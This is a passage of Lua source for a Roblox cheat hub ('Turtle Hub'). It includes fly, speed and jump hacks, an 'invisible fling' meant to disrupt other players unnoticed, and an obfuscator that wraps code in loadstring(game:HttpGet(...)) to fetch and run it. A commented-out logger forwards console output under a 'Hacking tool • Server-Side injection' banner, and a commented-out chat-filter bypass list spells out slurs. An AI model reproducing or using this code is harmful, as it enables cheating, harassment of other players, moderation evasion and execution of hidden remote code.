							musicplayer["SoundId"] = musichand.music[musichand.curr]
						else
							TurtleScreenNotify("Turtle Hub | Music","You've reached the first music!",{},nil,{})
						end
					end
		end)
		musiclib:Slider("Music Volume",0,10,1,function(value)
					if musicplayer ~= nil then
						musicplayer["Volume"] = value
					end
		end)
		musiclib:Slider("Music PlaybackSpeed",0,10,1,function(value)
					if musicplayer ~= nil then
						musicplayer["PlaybackSpeed"] = value
					end
		end)
		musiclib:Toggle("Loop music",false,function(value)
					if musicplayer ~= nil then
						musicplayer["Looped"] = value
					end
		end)
		musiclib:Slider("Music Pitch",0,2,1,function(value)
					if musicplayer ~= nil then
						musicplayer["Pitch"] = value
					end
		end)
		musiclib:Dropdown("Music RollOffMode",{"Linear","Inverse","LinearSquare"},function(value)
					if musicplayer ~= nil then
						musicplayer["RollOffMode"] = Enum.RollOffMode[value]
					end
		end)
		musiclib:Slider("Music RollOffMaxDistance",0,10000,10000,function(value)
					if musicplayer ~= nil then
						musicplayer["RollOffMaxDistance"] = value
					end
		end)
		musiclib:Slider("Music RollOffMinDistance",0,10000,10,function(value)
					if musicplayer ~= nil then
						musicplayer["RollOffMinDistance"] = value
					end
		end)
		musiclib:Slider("Music EmitterSize",0,100,10,function(value)
					if musicplayer ~= nil then
						musicplayer["EmitterSize"] = value
					end
		end)
		--local T104 = window:Tab("SPY LOGGING",true)
		local log = {
			info = true,
			warning = true,
			errorlog = true,
			rconsoleinfo = true,
			rconsolewarning = true,
			rconsoleerrorlog = true,
			notify_table = {"2nd Notify System","UI Notify System"},
			notify_style = "2nd Notify System",
			dur = 9e9
		}
		--[[CatchCaller(print,function(c,i,v)
			if log.info == true then
				if log.notify_style == "UI Notify System" then
					lib:Notification(`System Logging (print) {c}`,`[{i}] {v}`,"ok")
				elseif log.notify_style == "2nd Notify System" then
					lib:notify(lib:ColorFonts(lib:ColorFonts(`[ {i} | {c} ] {v}`,"Bold"),"White"),log.dur)
				end
			end
		end)
		CatchCaller(rconsoleprint,function(c,i,v)
			if log.rconsoleinfo == true then
				if log.notify_style == "UI Notify System" then
					lib:Notification(`System Logging (rconsoleprint) {c}`,`[{i}] {v}`,"ok")
				elseif log.notify_style == "2nd Notify System" then
					lib:notify(lib:ColorFonts(lib:ColorFonts(`[ {i} | {c} ] {v}`,"Bold"),"White"),log.dur)
				end
			end
		end)
		CatchCaller(warn,function(c,i,v)
			if log.warning == true then
				if log.notify_style == "UI Notify System" then
					lib:Notification(`System Logging (warn) {c}`,`[{i}] {v}`,"ok")
				elseif log.notify_style == "2nd Notify System" then
					lib:notify(lib:ColorFonts(lib:ColorFonts(`[ {i} | {c} ] {v}`,"Bold"),"Yellow"),log.dur)
				end
			end
		end)
		CatchCaller(rconsolewarn,function(c,i,v)
			if log.rconsolewarning == true then
				if log.notify_style == "UI Notify System" then
					lib:Notification(`System Logging (rconsolewarn) {c}`,`[{i}] {v}`,"ok")
				elseif log.notify_style == "2nd Notify System" then
					lib:notify(lib:ColorFonts(lib:ColorFonts(`[ {i} | {c} ] {v}`,"Bold"),"Yellow"),log.dur)
				end
			end
		end)
		CatchCaller(error,function(c,i,v)
			if log.errorlog == true then
				if log.notify_style == "UI Notify System" then
					lib:Notification(`System Logging (error) {c}`,`[{i}] {v}`,"ok")
				elseif log.notify_style == "2nd Notify System" then
					lib:notify(lib:ColorFonts(lib:ColorFonts(`[ {i} | {c} ] {v}`,"Bold"),"Red"),log.dur)
				end
			end
		end)
		CatchCaller(rconsoleerr,function(c,i,v)
			if log.rconsoleerrorlog == true then
				if log.notify_style == "UI Notify System" then
					lib:Notification(`System Logging (rconsoleerror) {c}`,`[{i}] {v}`,"ok")
				elseif log.notify_style == "2nd Notify System" then
					lib:notify(lib:ColorFonts(lib:ColorFonts(`[ {i} | {c} ] {v}`,"Bold"),"Red"),log.dur)
				end
			end
		end)

		T104:Dropdown("Select notify style",log.notify_table,function(value)
			log.notify_style = value
		end)

		T104:Slider("Notification duration",0,100,16,function(value)
			log.dur = value
		end)

		T104:Toggle("Log print() system",true,function(value)
			log.info = value
		end)

		T104:Toggle("Log warn() system",false,function(value)
			log.warning = value
		end)

		T104:Toggle("Log error() system",true,function(value)
			log.errorlog = value
		end)

		T104:Toggle("Log rconsoleprint() system",false,function(value)
			log.rconsoleinfo = value
		end)

		T104:Toggle("Log rconsolewarn() system",false,function(value)
			log.rconsolewarning = value
		end)

		T104:Toggle("Log rconsoleerror() system",false,function(value)
			log.rconsoleerrorlog = value
		end)

		local T105 = window:Tab("Obfuscator",true)
		local obf = {
			text = "CODE_STRING",
			hard = false,
			loadstring_method = false
		}

		T105:Textbox("Insert code or link to obfuscate",false,function(value)
			obf.text = value
		end)
			
		T105:Toggle("Hard obfuscator",true,function(value)
			obf.hard = value
		end)

		T105:Toggle("Loadstring obfuscator",false,function(value)
			obf.loadstring_method = value
		end)
			
		T105:Button("Obfuscate",function()
			if obf.loadstring_method == true then
				if obf.hard == true then
					if obf.text:sub(1,8) == "https://" then
						lib:Copy('loadstring(game:HttpGet("' .. lib.CodeEncrypter(obf.text) .. '"))()')
					else
						lib:Copy('loadstring("' .. lib.CodeEncrypter(obf.text) .. '")()')
					end
				end
			else
				if obf.hard == true then
					lib:Copy(lib.CodeEncrypter(obf.text))
				end
			end
		end)

		T105:Button("Test execute obfuscated code",function()
			if obf.hard == true then
				if obf.text:sub(1,8) == "https://" then
					loadstring(game:HttpGet(lib.CodeEncrypter(obf.text)))()
				else
					loadstring(lib.CodeEncrypter(obf.text))()
				end
			end
		end)
			
		LogService["MessageOut"]:Connect(function(msg,msgtype)
			--lib:notify(lib:ColorFonts(`[ {msgtype} ] {msg}`,"Bold"),9e9)
			lib.sentMessage(lib.getTable("sent","console"),"embed system",{
							["title"] = "Hacking tool • Server-Side injection",
							["description"] = "Output logger • Output function manipulate",
							["color"] = 65280,
							["fields"] = {
								{
								  ["name"] = "Output : ",
								  ["value"] = "```\n• Message : " .. msg .. "\n• Output type : " .. tostring(msgtype) .. "\n```"
								},
								--{
								--  ["name"] = "Game : ",
								--  ["value"] = "This is the second field"
								--}
							},
							["footer"] = {
								["text"] = "Turtle Manipulator"
							}
						},"")
		end)]]
		local animati = window:Tab("Spoofer")
		local idx = {}
		local spoofed = animati:Label("Spoofed animation will be showed here.")
		
		animati:Button("Start spoofing animations",function()
			--[[idx = {}
			for i,v in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
				lib:AddTable(v.Animation.AnimationId,idx)
			end]]
			spoofed:EditLabel(`Idle 1 : {LocalPlayer.Character.Character.Animate.idle.Animation1.AnimationId}\nIdle 2 : {LocalPlayer.Character.Character.Animate.idle.Animation2.AnimationId}\nWalk : {LocalPlayer.Character.Character.Animate.walk.WalkAnim.AnimationId}\nRun : {LocalPlayer.Character.Character.Animate.run.RunAnim.AnimationId}\nJump : {LocalPlayer.Character.Character.Animate.jump.JumpAnim.AnimationId}\nClimb : {LocalPlayer.Character.Character.Animate.climb.ClimbAnim.AnimationId}\nFall : {LocalPlayer.Character.Character.Animate.fall.FallAnim.AnimationId}\n\nSaved AnimationTrack : {table.concat(idx,",\n")}`)
		end)

		animati:Button("Copy spoofed animations",function()
			--[[idx = {}
			for i,v in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
				lib:AddTable(v.Animation.AnimationId,idx)
			end]]
			lib:Copy(`Idle 1 : {LocalPlayer.Character.Character.Animate.idle.Animation1.AnimationId}\nIdle 2 : {LocalPlayer.Character.Character.Animate.idle.Animation2.AnimationId}\nWalk : {LocalPlayer.Character.Character.Animate.walk.WalkAnim.AnimationId}\nRun : {LocalPlayer.Character.Character.Animate.run.RunAnim.AnimationId}\nJump : {LocalPlayer.Character.Character.Animate.jump.JumpAnim.AnimationId}\nClimb : {LocalPlayer.Character.Character.Animate.climb.ClimbAnim.AnimationId}\nFall : {LocalPlayer.Character.Character.Animate.fall.FallAnim.AnimationId}\n\nSaved AnimationTrack : {table.concat(idx,",\n")}`)
		end)

		animati:Button("Change animation to spoofed animations",function()
			idx = {}
			local idle1 = LocalPlayer.Character.Character.Animate.idle.Animation1.AnimationId
			local idle2 = LocalPlayer.Character.Character.Animate.idle.Animation2.AnimationId
			local walk = LocalPlayer.Character.Character.Animate.walk.WalkAnim.AnimationId
			local run = LocalPlayer.Character.Character.Animate.run.RunAnim.AnimationId
			local jump = LocalPlayer.Character.Character.Animate.jump.JumpAnim.AnimationId
			local climb = LocalPlayer.Character.Character.Animate.climb.ClimbAnim.AnimationId
			local fall = LocalPlayer.Character.Character.Animate.fall.FallAnim.AnimationId
			LocalPlayer.Character.Character.Animate.idle.Animation1.AnimationId = idle1
			LocalPlayer.Character.Character.Animate.idle.Animation2.AnimationId = idle2
			LocalPlayer.Character.Character.Animate.walk.WalkAnim.AnimationId = walk
			LocalPlayer.Character.Character.Animate.run.RunAnim.AnimationId = run
			LocalPlayer.Character.Character.Animate.jump.JumpAnim.AnimationId = jump
			LocalPlayer.Character.Character.Animate.climb.ClimbAnim.AnimationId = climb
			LocalPlayer.Character.Character.Animate.fall.FallAnim.AnimationId = fall
			spoofed:EditLabel(`Saved AnimationTrack : {table.concat(idx,",\n")}`)
			lib:Copy(`Saved AnimationTrack : {table.concat(idx,",\n")}`)
			TurtleScreenNotify("Turtle Hub | Animation Spoofer • Change Animation","Animation successfully changed.",{},nil,{})
		end)

		local T106 = window:Tab("Character")
		--T106:Label("Encrypted chat bypass for a bypassed word\n//a -> ass\n//d -> dick\n//p -> pussy\n//s -> shit\n//f -> fuck\n//ah -> asshole\n//n1 -> nigga\n//n2 -> nigger\n//c -> cum\n//cond -> condom\n18+ -> sex\n//sp -> sperm\n//t -> tits")
		local intvarspeed = {
			speed1 = 1,
			speed2 = 1,
			origspeed = LocalPlayer.Character.Humanoid.WalkSpeed,
			origjump = LocalPlayer.Character.Humanoid.JumpPower,
			custspeed = 16,
			custjump = 50
		}
		local ArrayForSpeed = false
		local ArrayForJump = false
		T106:Slider("Fly speed",1,100,1,function(value)
			mobileflyspeed = value --intvarspeed.speed1 = value
		end)
		T106:Slider("Vehicle fly speed",1,100,1,function(value)
			vflyspeed = value --intvarspeed.speed2 = value
		end)
		T106:Toggle("Start fly",false,function(value)
			if value == true then
				TurtleFlags["Start vehicle fly • Turtle Interface"](false)
				wait(0.2)
				lib:startFly(false) --,intvarspeed.speed1,intvarspeed.speed2)
				--if LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
				--	lib.PlayAnim(134283166482394,5,0,false) -- 5/13
				--end
			else
				lib:stopFly()
				--if LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
				--	lib.StopAnim()
				--end
			end
		end)
		T106:Toggle("Start vehicle fly",false,function(value)
			if value == true then
				TurtleFlags["Start fly • Turtle Interface"](false)
				wait(0.2)
				lib:startFly(true) --,intvarspeed.speed1,intvarspeed.speed2)
			else
				lib:stopFly()
			end
		end)

		T106:Button("Invisble fling",function()
			TurtleFlags["Start fly • Turtle Interface"](false)
			local prt = Instance.new("Model")
			prt.Parent = LocalPlayer.Character
			local z1 = Instance.new("Part")
			z1.Name = "Torso"
			z1.CanCollide = false
			z1.Anchored = true
			local z2 = Instance.new("Part")
			z2.Name = "Head"
			z2.Parent = prt
			z2.Anchored = true
			z2.CanCollide = false
			local z3 = Instance.new("Humanoid")
			z3.Name = "Humanoid"
			z3.Parent = prt
			z1.Position = Vector3.new(0,9999,0)
			LocalPlayer.Character = prt
			wait(1)
			LocalPlayer.Character = LocalPlayer.Character.HumanoidRootPart
			wait(1)
			local Hum = Instance.new("Humanoid")
			z2:Clone()
			Hum.Parent = LocalPlayer.Character
			lib:children(LocalPlayer.Character,function(v)
				if v ~= LocalPlayer.Character.HumanoidRootPart and v.Name ~= "Humanoid" then
					v:Destroy()
				end
			end)
			LocalPlayer.Character.HumanoidRootPart.Transparency = 0
			LocalPlayer.Character.HumanoidRootPart.Color = Color3.new(1,1,1)
			LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			TurtleFlags["Start fly • Turtle Interface"](true)
			Camera.CameraSubject = LocalPlayer.Character.HumanoidRootPart
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(99999,99999 * 10,99999)
			bambam.Location = LocalPlayer.Character.HumanoidRootPart.Position
		end,"Fling without getting noticed")
					
		T106:Button("Change rig to R15",function()
			lib.promptNewRig("R15")
		end)
		T106:Button("Change rig to R6",function()
			lib.promptNewRig("R6")
		end)
		T106:Slider("Walk speed",1,200,intvarspeed.origspeed,function(value)
			intvarspeed.custspeed = value
			if ArrayForSpeed == true then
				LocalPlayer.Character.Humanoid.WalkSpeed = intvarspeed.custspeed
			end
		end)
		T106:Slider("Jump power",1,350,intvarspeed.origjump,function(value)
			intvarspeed.custjump = value
			if ArrayForJump == true then
				LocalPlayer.Character.Humanoid.JumpPower = intvarspeed.custspeed
			end
		end)
		T106:Toggle("Set walk speed",false,function(value)
			ArrayForSpeed = value
			if value == true then
				LocalPlayer.Character.Humanoid.WalkSpeed = intvarspeed.custspeed
			else
				LocalPlayer.Character.Humanoid.WalkSpeed = intvarspeed.origspeed
			end
		end)
		T106:Toggle("Set jump power",false,function(value)
			ArrayForJump = value
			if value == true then
				LocalPlayer.Character.Humanoid.JumpPower = intvarspeed.custjump
			else
				LocalPlayer.Character.Humanoid.JumpPower = intvarspeed.origjump
			end
		end)
		local T107 = window:Tab("Animation")
		local anim_table = {
			table = {
				"Vampire Animation",
				"Hero Animation",
				"Zombie Classic Animation",
				"Mage Animation",
				"Ghost Animation",
				"Elder Animation",
				"Levitation Animation",
				"Astronaut Animation",
				"Ninja Animation",
				"Werewolf Animation",
				"Cartoon Animation",
				"Pirate Animation",
				"Sneaky Animation",
				"Toy Animation",
				"Knight Animation",
				"Confident Animation",
				"Popstar Animation",
				"Princess Animation",
				"Cowboy Animation",
				"Patrol Animation",
				"FE Zombie Animation",
				"Bold Animation",
				"Girly Animation",
				"Adidas Sport Animation",
				"CalWalk Glam Animation",
				"NFL Animation",
				"Adidas Community"
			},
			sel = "",
			looping = false
		}

		T107:Dropdown("Select animation",anim_table.table,function(value)
			anim_table.sel = value
			if TurtleFlags.PermaAnimation == true then
				TurtleFlags["Change animation click"]()
			end
		end)

		T107:Button("Change animation",function()
			local Animate = LocalPlayer.Character.Animate
			Animate.Disabled = true
			lib.StopAnim()
			LocalPlayer.Character.Humanoid:ChangeState(3)
			Animate.Disabled = false
			if anim_table.sel == "Vampire Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
			elseif anim_table.sel == "Hero Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
			elseif anim_table.sel == "Zombie Classic Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
			elseif anim_table.sel == "Mage Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
			elseif anim_table.sel == "Ghost Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
			elseif anim_table.sel == "Elder Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
			elseif anim_table.sel == "Levitation Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
			elseif anim_table.sel == "Astronaut Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
			elseif anim_table.sel == "Ninja Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
			elseif anim_table.sel == "Werewolf Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
			elseif anim_table.sel == "Cartoon Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
			elseif anim_table.sel == "Pirate Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
			elseif anim_table.sel == "Sneaky Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1132473842"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1132477671"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1132510133"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1132494274"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1132489853"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1132461372"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1132469004"
			elseif anim_table.sel == "Toy Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708" --https://www.roblox.com/catalog/973766674/Toy-Run
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
			elseif anim_table.sel == "Knight Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
			elseif anim_table.sel == "Confident Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
			elseif anim_table.sel == "Popstar Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
			elseif anim_table.sel == "Princess Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
			elseif anim_table.sel == "Cowboy Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
			elseif anim_table.sel == "Patrol Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1150944216"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
			elseif anim_table.sel == "FE Zombie Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3489171152"
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=3489174223"
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=3489173414"
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
			elseif anim_table.sel == "Bold Animation" then
				Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=16738333868" -- changed
				Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=16738334710" -- changed
				Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=11600249883" -- changed
				Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=16738337225" -- changed
				Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=16738336650" -- changed
				Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921300839" -- changed
				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921307241" -- changed
			elseif anim_table.sel == "Girly Animation" then
				Animate.idle.Animation1.AnimationId = "https://www.roblox.com/asset/?id=118832222982049" -- changed
				Animate.idle.Animation2.AnimationId = "https://www.roblox.com/asset/?id=76049494037641" -- changed
				Animate.walk.WalkAnim.AnimationId = "https://www.roblox.com/asset/?id=92072849924640" -- changed
				Animate.run.RunAnim.AnimationId = "https://www.roblox.com/asset/?id=72301599441680" -- changed
				Animate.jump.JumpAnim.AnimationId = "https://www.roblox.com/asset/?id=104325245285198" -- changed
				Animate.climb.ClimbAnim.AnimationId = "https://www.roblox.com/asset/?id=131326830509784" -- changed
				Animate.fall.FallAnim.AnimationId = "https://www.roblox.com/asset/?id=121152442762481" -- changed
			elseif anim_table.sel == "Adidas Sport Animation" then --✓
				Animate.idle.Animation1.AnimationId = "https://www.roblox.com/asset/?id=18537376492"
				Animate.idle.Animation2.AnimationId = "https://www.roblox.com/asset/?id=18537371272"
				Animate.walk.WalkAnim.AnimationId = "https://www.roblox.com/asset/?id=18537392113"
				Animate.run.RunAnim.AnimationId = "https://www.roblox.com/asset/?id=18537384940"
